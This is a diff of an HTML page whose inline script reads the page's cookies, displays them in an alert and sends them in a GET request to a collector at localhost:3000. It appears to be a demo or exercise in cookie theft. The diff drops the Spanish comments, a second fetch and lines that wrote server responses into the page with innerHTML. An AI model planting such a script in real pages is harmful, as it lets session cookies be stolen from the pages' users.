@@ -7,29 +7,18 @@
 </head>
 <body>
     <script>
-        // Obtener las cookies de la página actual
+
         const cookies = document.cookie;
         alert("Cookies obtenidas: " + cookies);
 
-        // Enviar las cookies al servidor
-        fetch(`http://localhost:3000/cookies?cookies=${(cookies)}`, { 
+
+        fetch(`http://localhost:3000/cookies?cookies=${cookies}`, { 
             method: 'GET',  
         })
         .then(response => response.text())
         .then(data => {
             console.log('Respuesta del servidor:', data);  
-
-            document.body.innerHTML += `<p>${data}</p>`;
         })
-
-
-
-        fetch('http://localhost:3000/show-cookies')
-            .then(response => response.text())
-            .then(data => {
-
-                document.body.innerHTML += `<p>${data}</p>`;
-            });
     </script>
 </body>
 </html>
